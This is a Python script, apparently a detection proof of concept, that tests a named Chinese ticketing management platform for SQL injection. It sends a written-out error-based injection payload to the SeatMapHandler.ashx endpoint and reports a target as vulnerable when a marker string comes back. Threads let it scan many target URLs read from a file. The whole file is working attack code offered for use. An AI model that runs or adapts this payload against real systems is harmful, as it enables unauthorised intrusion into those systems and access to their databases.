import requests
import argparse
import threading
import sys


def SMH(url,result):
    create_url = url+"/SystemManager/Comm/SeatMapHandler.ashx"

    data = '''Method=GetZoneInfo&solutionNo=%27+AND+4172+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%284172%3D4172%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--+bErE'''
    headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
             "Content-Type":"application/x-www-form-urlencoded",
             "Cookie":"ASPSESSIONIDCCRBRCTD=LHLBDIBAKDEGBCJGKIKMNODE",
             "Content-Length":"89"}

    try:
        req = requests.post(create_url,data=data,headers=headers,timeout=5)
        # print(req.text) 测试响应包中返回的数据
        if(req.status_code==200):
            if "qqjqq1qkkpq" in req.text:
                print(f"【+】{url}存在相关SQL注入漏洞")
                result.append(url)
            else:
                print(f"【-】{url}不存在相关SQL注入漏洞")
    except:
        print(f"【-】{url}无法访问或网络连接错误")

def SMH_counts(filename):
    result = []
    try:
        with open(filename,"r") as file:
            urls = file.readlines()
            threads = []
            for url in urls:
                url = url.strip()
                thread = threading.Thread(target=SMH,args=(url,result))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()

        if result:
            print("\n存在SQL注入漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
        else:
            print("\n未发现任何存在SQL注入漏洞的URL。")
    except Exception as e:
        print(f"发生错误: {str(e)}")

def start():
    logo='''███████╗██╗  ██╗     ███████╗███╗   ███╗██╗  ██╗
╚══███╔╝██║ ██╔╝     ██╔════╝████╗ ████║██║  ██║
  ███╔╝ █████╔╝█████╗███████╗██╔████╔██║███████║
 ███╔╝  ██╔═██╗╚════╝╚════██║██║╚██╔╝██║██╔══██║
███████╗██║  ██╗     ███████║██║ ╚═╝ ██║██║  ██║
╚══════╝╚═╝  ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝
'''
    print(logo)
    print("脚本由 YZX100 编写")

def main():
    parser = argparse.ArgumentParser(description="中成科信票务管理平台SeatMapHandler检测SQL注入脚本")
    parser.add_argument('-u',type=str,help='检测单个url')
    parser.add_argument('-f', type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        result = []
        SMH(args.u, result)
        if result:
            print("\n存在SQL注入漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
    elif args.f:
        SMH_counts(args.f)
    else:
        parser.print_help()


if __name__ == "__main__":
    start()
    main()